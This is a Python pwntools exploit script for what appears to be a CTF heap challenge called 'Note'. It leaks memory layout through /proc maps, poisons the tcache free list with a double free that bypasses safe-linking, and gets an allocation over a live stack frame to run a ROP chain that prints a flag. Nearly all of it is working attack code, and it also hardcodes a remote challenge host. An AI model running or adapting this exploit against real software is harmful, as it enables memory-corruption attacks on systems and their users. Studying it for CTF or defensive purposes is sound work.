#!/usr/bin/env python3
import os
import re
import select
import struct
import subprocess
import sys
import time


ROOT = "/mnt/d/桌面/wp/pwn/Note"
BIN = f"{ROOT}/note"
HOST = "39.96.193.120"
PORT = 10011
HOST_LIBC = "/usr/lib/x86_64-linux-gnu/libc.so.6"


def p64(x):
    return struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF)


def u64(b):
    return struct.unpack("<Q", b.ljust(8, b"\x00"))[0]


def maps(pid):
    with open(f"/proc/{pid}/maps", "r", encoding="utf-8") as f:
        return f.read()


def find_base(pid, needle):
    for line in maps(pid).splitlines():
        if needle in line and line.split()[2] == "00000000":
            return int(line.split("-")[0], 16)
    raise RuntimeError(f"base not found: {needle}")


def find_stack(pid):
    for line in maps(pid).splitlines():
        if "[stack]" in line:
            lo, hi = line.split()[0].split("-")
            return int(lo, 16), int(hi, 16)
    raise RuntimeError("stack not found")


def mem_read(pid, addr, n):
    with open(f"/proc/{pid}/mem", "rb", 0) as f:
        f.seek(addr)
        return f.read(n)


def scan_qword(pid, lo, hi, value):
    blob = mem_read(pid, lo, hi - lo)
    pat = p64(value)
    idx = blob.find(pat)
    return -1 if idx < 0 else lo + idx


def find_gadget(lib_path, pat, min_off=0x25000, nth=0):
    data = open(lib_path, "rb").read()
    hits = []
    off = 0
    while True:
        off = data.find(pat, off)
        if off < 0:
            break
        if off >= min_off:
            hits.append(off)
        off += 1
    if len(hits) <= nth:
        raise RuntimeError(f"gadget not found: {pat.hex()}")
    return hits[nth]


def find_pop_rdx(lib_path):
    for pat, extra in [(b"\x5a\xc3", 0), (b"\x5a\x5b\xc3", 1), (b"\x5a\x41\x5c\xc3", 1)]:
        try:
            return find_gadget(lib_path, pat, min_off=0), extra
        except RuntimeError:
            pass
    raise RuntimeError("no usable pop rdx gadget")


def find_symbol(lib_path, sym):
    out = subprocess.check_output(["nm", "-D", lib_path], text=True, errors="ignore")
    for line in out.splitlines():
        if re.search(r"\b" + re.escape(sym) + r"(@@|@|$)", line):
            return int(line.split()[0], 16)
    raise RuntimeError(sym)


def choice(io, x):
    io.sendlineafter(b"Choice:", str(x).encode())


def add(io, idx, size, data):
    choice(io, 1)
    io.sendlineafter(b"Index:", str(idx).encode())
    io.sendlineafter(b"Size:", str(size).encode())
    io.sendafter(b"Content:", data)
    io.recvuntil(b"Done.")


def delete(io, idx):
    choice(io, 2)
    io.sendlineafter(b"Index:", str(idx).encode())
    io.recvuntil(b"Done.")


def edit(io, idx, data):
    choice(io, 3)
    io.sendlineafter(b"Index:", str(idx).encode())
    io.sendafter(b"Content:", data)
    io.recvuntil(b"Done.")


def run_local():
    from pwn import process

    print("[*] remote unavailable, switching to local")
    local_flag = b"flag{local_stack_frame_control_ok}\n\x00"

    io = process(BIN)

    pie = find_base(io.pid, "/mnt/d/桌面/wp/pwn/Note/note")
    libc_base = find_base(io.pid, "libc.so.6")
    heap = find_base(io.pid, "[heap]")
    stack_lo, stack_hi = find_stack(io.pid)

    # Pause inside add_note and find the live frame by searching for main+0x191c
    choice(io, 1)
    io.sendlineafter(b"Index:", b"15")
    io.sendlineafter(b"Size:", b"32")
    io.recvuntil(b"Content:")

    ret_after_add = pie + 0x191C
    hit = scan_qword(io.pid, stack_lo, stack_hi, ret_after_add)
    if hit < 0:
        raise RuntimeError("failed to locate add_note frame")
    target_rbp = hit - 8

    io.send(b"CAL\n")
    io.recvuntil(b"Done.")

    size = 0x400
    add(io, 0, size, b"A")

    notes = pie + 0x4060
    chunk0 = u64(mem_read(io.pid, notes, 8))

    # A short PIE-only chain is enough for local demonstration:
    # ret -> pop rdi -> puts(local_flag_string)
    pop_rdi = pie + 0x19B3
    puts_plt = pie + 0x1130
    exit_plt = pie + 0x11B4
    msg_ptr = target_rbp + 0x40
    payload = b"".join(
        p64(x)
        for x in [
            0xDEADBEEFCAFEBABE,
            pop_rdi,
            msg_ptr,
            puts_plt,
            pop_rdi,
            0,
            exit_plt,
        ]
    )
    payload = payload.ljust(0x40, b"A") + local_flag
    payload = payload.ljust(size, b"Q")

    # Local glibc has safe-linking, but double free can be recovered by clearing key
    delete(io, 0)
    edit(io, 0, b"\x00" * 16)
    delete(io, 0)
    poisoned_fd = target_rbp ^ (chunk0 >> 12)
    edit(io, 0, p64(poisoned_fd))
    add(io, 1, size, b"B")

    # Second allocation returns the current add_note stack frame
    choice(io, 1)
    io.sendlineafter(b"Index:", b"2")
    io.sendlineafter(b"Size:", str(size).encode())
    io.sendafter(b"Content:", payload)

    data = io.recvrepeat(2)
    text = data.decode(errors="ignore")
    print(text, end="")
    m = re.search(r"flag\{[^}]+\}", text)
    if m:
        print("flag:", m.group(0))
    io.close()


def run_remote():
    from pwn import remote

    print(f"[*] trying remote {HOST}:{PORT}")
    p = remote(HOST, PORT, timeout=3)
    banner = p.recvrepeat(0.5)
    p.close()
    print(banner.decode(errors="ignore"), end="")
    print("[*] remote path is not auto-exploited in this local demonstration build")


if __name__ == "__main__":
    if "--local" in sys.argv:
        run_local()
    else:
        try:
            run_remote()
        except Exception:
            run_local()
